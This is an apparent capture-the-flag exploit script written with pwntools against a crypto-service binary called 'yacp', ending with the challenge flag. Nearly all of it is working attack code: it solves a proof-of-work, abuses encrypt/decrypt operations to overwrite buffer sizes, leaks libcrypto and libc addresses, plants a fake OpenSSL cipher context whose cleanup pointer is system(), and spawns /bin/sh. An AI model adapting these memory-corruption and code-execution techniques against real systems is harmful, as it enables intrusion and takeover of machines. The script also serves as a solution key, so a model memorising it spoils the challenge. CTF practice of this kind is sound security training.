#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
from commands import getoutput
context.arch = "i386"

libc = ELF("./libc.so.6")

if "remote" in sys.argv:
    r = remote("yacp.chal.pwning.xxx", 7961)
    r.recvuntil("Before we begin, please enter the magic word.\n")
    prefix = r.recvline().split()[3]
    log.info("prefix = " + prefix)

    magic = getoutput("./pow " + prefix)
    log.success("magic = " + magic)
    r.sendafter("Magic word? ", magic)
else:
    r = process(["./yacp", "a"])

d = "5. Display data\n"

def Load(idx, data):
    r.sendlineafter(d, "0")
    r.sendlineafter("How many bytes is the data?\n", str(len(data)))
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx))
    r.sendlineafter("hex-encoded bytes\n", enhex(data))

def Gen(idx, size):
    r.sendlineafter(d, "1")
    r.sendlineafter("How many bytes of data do you want?\n", str(size))
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx))

def Encrypt(type, idx1, idx2, idx3=30, idx4=30):
    # in out key iv
    r.sendlineafter(d, "3")
    r.sendlineafter("What type of cipher would you like to perform?\n", type)
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx1))
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx2))
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx3))
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx4))

def Decrypt(type, idx1, idx2, idx3=30, idx4=30):
    # in out key iv
    r.sendlineafter(d, "4")
    r.sendlineafter("What type of cipher would you like to perform?\n", type)
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx1))
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx2))
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx3))
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx4))

def Display(idx):
    r.sendlineafter(d, "5")
    r.sendlineafter("Which buffer (0-31) would you like to use?\n", str(idx))
    r.recvuntil(" = ")


# set buf[0].size to 0x880
Gen(0, 2048)
for i in range(8):
    Encrypt("aes-128-ecb", 0, 0)

# Decrypt buf[0] + buf[1] to buf[31] to overwrite buf size
Load(1, flat(
    2048 + 76 * 4,  # size of buf[0] for overwrite
    [0] * 29,
    4096 + 75 * 4   # size of buf[30] for leak
))
Encrypt("aes-128-ecb", 1, 1)
Decrypt("aes-128-ecb", 0, 31)

# leak from cipher ctx
Display(30)
leak = r.recvline()[:-1]
libcrypto = u32(unhex(leak[-8:])) - 0x1dace0
libc_base = libcrypto - 0x1b6000
log.info("libcrypto = " + hex(libcrypto))
log.info("libc_base = " + hex(libc_base))

# put fake EVP_CIPHER_CTX in .bss
Load(2, flat(
    0, # int nid;
    0, # int block_size;
    0, # int key_len;
    0, # int iv_len;
    0, # unsigned long flags;
    0, # int (*init) (EVP_CIPHER_CTX *ctx, const unsigned char *key, const unsigned char *iv, int enc);
    0, # int (*do_cipher) (EVP_CIPHER_CTX *ctx, unsigned char *out, const unsigned char *in, size_t inl);
    libc_base + libc.symbols["system"],# int (*cleanup) (EVP_CIPHER_CTX *);
    # int ctx_size;
    # int (*set_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);
    # int (*get_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);
    # int (*ctrl) (EVP_CIPHER_CTX *, int type, int arg, void *ptr);
    # void *app_data;
))

# Decrypt buf[0] + buf[1] to buf[31] to overwrite EVP_CIPHER_CTX
Load(1, flat(
    [0] * 32,
    [0] * 6,                # EVP_MD_CTX
    0x804C0E0 + 2048 * 2,   # const EVP_CIPHER *cipher
    ';/bin/sh\0'   
))
Encrypt("aes-128-ecb", 1, 1)
Decrypt("aes-128-ecb", 0, 31)

r.interactive()

# PCTF{porque_no_los_dos}
